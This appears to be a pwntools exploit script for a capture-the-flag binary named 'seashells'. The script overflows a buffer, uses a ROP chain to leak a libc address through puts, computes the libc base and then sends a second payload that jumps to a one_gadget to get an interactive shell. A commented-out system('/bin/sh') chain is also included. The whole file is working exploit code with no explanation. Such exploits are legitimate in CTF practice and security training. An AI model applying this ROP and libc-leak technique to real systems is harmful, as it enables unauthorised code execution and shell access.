from pwn import *


e = ELF("./seashells")
libc = ELF("./libc.so.6")

p = process("./seashells")

gdb.attach(p, "break * main+164")

#context.log_level = "debug"

p.recvuntil("?\n")

ret = 0x000000000040057e
pop_rdi = 0x400803

exploit = "A"*10


exploit += p64(ret)

exploit += p64(pop_rdi)

exploit += p64(e.sym["__libc_start_main"])

exploit += p64(e.plt["puts"])

exploit += p64(0x4006f2)

p.sendline(exploit)

p.recvline()

dat = p.recvline()
#print("dat", dat)


print("leaking from", hex(e.sym["__libc_start_main"]))
libc_start_main = u64(dat.strip()[:6].ljust(8, "\x00"))

print("libc start main", hex(libc_start_main))

libc.address = libc_start_main - 0x21ab0


exploit = "A"*10
"""

exploit += p64(ret)

exploit += p64(pop_rdi)

exploit += p64(next(libc.search("/bin/sh")))

exploit += p64(libc.sym["system"])
"""
exploit += p64(0)
exploit += p64(libc.address + 0x4f2c5)

print("one_gadget", hex(libc.address+0x4f2c5))

p.recvuntil("?\n")

p.sendline(exploit)

p.interactive()
